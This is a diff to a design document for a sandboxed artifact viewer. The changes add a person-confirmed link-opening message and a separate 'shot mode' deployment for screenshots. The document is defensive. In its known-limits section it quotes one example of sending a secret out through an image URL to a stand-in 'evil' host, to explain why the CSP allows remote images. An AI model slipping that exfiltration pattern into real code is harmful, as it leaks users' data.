@@ -7,6 +7,7 @@ nothing: no compile step, no render server, no per-view CPU. Every file the view
 without running any code of ours.
 
 The contract between the app and the viewer is `tulmi/src/artifacts/protocol.ts` (both sides import it; the viewer does not change it).
+A second deployment of the same code, kept for the screenshots the agent compares with the approved artifact, is described in [14](#14-shot-mode-the-viewer-kept-for-screenshots).
 
 ```
  app (tailzu.space)                     viewer (its own site)
@@ -23,7 +24,7 @@ The contract between the app and the viewer is `tulmi/src/artifacts/protocol.ts`
 Contents: [1 Security model](#1-security-model) · [2 What the app must do](#2-what-the-app-must-do) · [3 Renderers](#3-renderers) ·
 [4 Element ids](#4-element-ids-point-and-change) · [5 Streaming](#5-streaming) · [6 Errors](#6-errors) · [7 The bridge](#7-the-bridge-windowtailzu) ·
 [8 Design kit, theme, Tailwind](#8-design-kit-theme-tailwind) · [9 Sizes and times](#9-sizes-and-times) · [10 Vendoring](#10-vendoring) ·
-[11 Tests](#11-tests) · [12 Deploy](#12-deploy) · [13 Known limits](#13-known-limits)
+[11 Tests](#11-tests) · [12 Deploy](#12-deploy) · [13 Known limits](#13-known-limits) · [14 Shot mode](#14-shot-mode-the-viewer-kept-for-screenshots)
 
 ---
 
@@ -80,7 +81,7 @@ goes up to the app, which calls the API as the person. Messages that come down c
 - *Out:* `postMessage(msg, targetOrigin)` always names the parent's origin: the one the browser reports for the embedding page
   (`location.ancestorOrigins`, else the referrer) if it is allowed, else each configured origin in turn, so a message reaches only the page
   it is for. `ready` is sent the same way.
-- *From an HTML artifact's frame:* the shell accepts a message only from a frame it created (by window identity), passes on only the six
+- *From an HTML artifact's frame:* the shell accepts a message only from a frame it created (by window identity), passes on only the seven
   message kinds the artifact may send, rebuilds each from its known fields, and re-checks the limits of `LIMITS`.
 
 **What a hostile artifact can still do** (and what the app must therefore do) is in [2](#2-what-the-app-must-do) and [13](#13-known-limits).
@@ -108,7 +109,13 @@ The viewer is half of a pair; the other half is the app's iframe handling. These
    nothing is reported, and the first `stream` starts the page.
 6. **Size the iframe from `resize`** (the height of the content; fixed or absolutely positioned content is not counted, give such an
    artifact a fixed-height container). Pick your own minimum height.
-7. **Links in an artifact do not open** (there is no popup and no navigation). The protocol has no "open link" message; see [13](#13-known-limits).
+7. **Links in an artifact do not navigate; they ask.** A click on a link to an absolute `http(s)` address, or a `window.open` made right after a
+   person did something, becomes `{t: "open", url}`. The viewer never moves, and never opens anything itself. **The app** handles the
+   message: check the address again (absolute `http(s)`, no credentials in it; `viewer/lib/links.ts` `openableUrl` is the rule the viewer
+   used), **confirm with the person** ("Open example.com in your browser?", showing the host), and only then open it in the system browser.
+   Never open it without the confirmation, and never in the app's own window. At most one `open` arrives per 400 ms per window, and only
+   from the visible frame. Links to `#anchors` scroll as before; a relative link, `mailto:`, `javascript:`, a link with a password in
+   it and a click an artifact handled itself (its own `preventDefault`) send nothing. See [13](#13-known-limits).
 
 ---
 
@@ -334,7 +341,8 @@ npx wrangler deploy --dry-run --outdir dist
 - **worker** (`test/`, `@cloudflare/vitest-plugin`, real Workers Static Assets in workerd): headers and CSP (every directive, the import-map
   hash, `frame-ancestors` from config and fail-closed), the `/__host` gate, `/shell.html` hidden, immutable caching, CORS, content types and
   hashed names of every file in the import map, 304s.
-- **e2e** (`e2e/`, Playwright + Chromium against `wrangler dev`): every type renders; React with Recharts + lucide; every `ARTIFACT_LIBS`
+- **e2e** (`e2e/`, Playwright + Chromium against `wrangler dev`; `links.spec.ts` for `open`, `shot.spec.ts` for [14](#14-shot-mode-the-viewer-kept-for-screenshots),
+  which starts a second `wrangler dev` with `VIEWER_PARENT_ORIGINS=null` on port 8798): every type renders; React with Recharts + lucide; every `ARTIFACT_LIBS`
   import; syntax/import/runtime errors with the right line and column; select mode in React, HTML and SVG; streaming for every type;
   `fetch`/XHR/WebSocket/`eval` blocked; no cookies/storage; no navigation; forged messages ignored; storage/ask/download round trips;
   limits; kit; Tailwind; resize; embedding by a stranger refused; timings.
@@ -362,8 +370,10 @@ CI (`.github/workflows/ci.yml`, job `viewer`) runs the same steps, with `npm run
 
 ## 13. Known limits
 
-- **No "open link".** A link in an artifact does nothing (anchors `#x` scroll). The protocol has no message for it; a `{t: "open", url}`
-  `FrameMsg` that the app confirms with the person would add it.
+- **`open` is a request, not an action.** Anchors `#x` scroll; a link to another site sends `{t: "open", url}` and the app decides (rule 7
+  of [2](#2-what-the-app-must-do)). An artifact can make the app ask the person once per 400 ms with a real click on a link; the app's
+  confirmation is what keeps that from being a way to send people to a site: show the host, and do not remember "yes".
+  Links that are not absolute `http(s)` addresses do nothing; there is no way to open an app link, a phone number or a file.
 - **`img-src https:` is a one-way channel.** An image URL can carry data out (`new Image().src = "https://evil/?" + secret`). It is
   allowed because artifacts show remote pictures; the only secrets in the frame are the artifact's own data and what `ask` returned.
   Tighten `img-src` in `src/csp.ts` if that changes.
@@ -377,3 +387,49 @@ CI (`.github/workflows/ci.yml`, job `viewer`) runs the same steps, with `npm run
 - Tested in Chromium (Playwright) and workerd only. The browser features used (import maps, `import.meta.resolve`, `srcdoc` frames, blob modules,
   `ResizeObserver`) are in Safari 16.4+ and Firefox 106+; `location.ancestorOrigins` is not in Firefox, where the referrer or the configured
   list is used instead. Check a real iOS/Android WebView before relying on it.
+
+---
+
+## 14. Shot mode: the viewer kept for screenshots
+
+The agent checks what it built against the approved artifact (`docs/artifacts.md` section 11). The approved artifact is a screenshot of
+**this viewer**, taken by Cloudflare's Browser Rendering, which needs a page to put in front of the viewer, because the viewer is driven
+by `postMessage` from a parent: wait for `ready`, send `load`, wait for `rendered`. `tulmi/src/artifacts/shothost.ts` makes that page, and sends
+it to the browser as inline HTML (`/screenshot` takes `html` instead of `url`), so there is nothing to host.
+
+A page made from inline HTML has an **opaque origin** (`"null"`), and that breaks two rules of the normal viewer:
+
+- `frame-ancestors` cannot name an opaque origin. `'none'`, a list of sites, even `*` all refuse it (`*` matches only schemes with a host). The
+  only way to let such a page frame the viewer is to leave the directive out.
+- The origin check on messages (`event.origin` against `VIEWER_PARENT_ORIGINS`) sees `"null"`, which `parseOrigins` drops on purpose.
+
+So there is a **second deployment** of the same code, for shots and nothing else. It differs by one setting:
+
+| | normal viewer | shot viewer |
+|---|---|---|
+| `VIEWER_PARENT_ORIGINS` | `https://tailzu.space,https://www.tailzu.space` | `null` |
+| `frame-ancestors` | the list | **not sent** (any page can frame it) |
+| messages believed | from the listed origins | from a parent whose origin is opaque, and nobody else |
+| used by | the app's iframes | `ARTIFACT_SHOT_VIEWER_URL`, in the host page of a shot |
+
+The rest of the policy is the same, and every other protection holds: no cookies, no storage, no network, no token, sandboxed frames, the
+checks on what an artifact may send. What the shot viewer gives up is only *who may frame it*. That is acceptable because it holds nothing
+to steal (it renders what it is sent, and the only data in it is what the sender gave it), but it must not be the one the app uses: a page
+that frames a viewer controls what the person sees in it. A test (`e2e/shot.spec.ts`) checks both halves: the normal viewer refuses the
+shot host page, and an ordinary `http` page that frames the shot viewer hears `ready` but cannot make it load anything.
+
+**Deploy.** From the same `viewer/` directory, with a second name so that it does not replace the first:
+
+```
+npx wrangler deploy --name tailzu-viewer-shots --var VIEWER_PARENT_ORIGINS:null --var ENV:production
+```
+
+(or a second `wrangler.shots.jsonc` with that name and var). Its address, `https://tailzu-viewer-shots.<account>.workers.dev`, is the
+Worker's `ARTIFACT_SHOT_VIEWER_URL` (`jobs/`) and the VPS's. The shot viewer is reached from Cloudflare's browser, so it must be public;
+it needs no custom domain.
+
+**Settings the shot has to match.** The host page gives the iframe the viewport's exact size and `sandbox="allow-scripts"`, as the app
+does; it waits for `rendered`, then `SHOT_SETTLE_MS` (700 ms) for web fonts and images, then adds `#done`, which `/screenshot` waits for.
+An artifact that never renders never gets `#done`, and the shot fails with a timeout instead of showing a blank page. The request limits what
+the browser may fetch to the shot viewer, Google Fonts and `data:`/`blob:` (`allowRequestPattern`), so pictures from other sites are blank in a
+shot, and the comparison is told that.
